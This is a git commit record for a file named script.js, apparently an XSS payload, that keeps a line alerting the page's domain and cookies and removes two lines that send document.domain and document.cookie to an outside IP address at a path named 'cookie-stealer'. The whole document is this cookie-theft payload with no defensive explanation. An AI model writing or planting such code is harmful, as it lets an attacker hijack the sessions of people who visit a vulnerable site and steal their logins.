e0e6e3a616f36de7eee94c9c79bf4f25d58b5455
rfelecT <157028039+rfelecT@users.noreply.github.com>
2024-11-30 17:38:10 +0330

    Update script.js

--- script.js
+++ script.js
@@ -1,3 +1,1 @@
   alert(document.domain + "\n" + document.cookie);
-  var img = new Image();
-  img.src = 'http://49.13.194.218/cookie-stealer?domain=' + encodeURIComponent(document.domain) + '&cookie=' + encodeURIComponent(document.cookie);
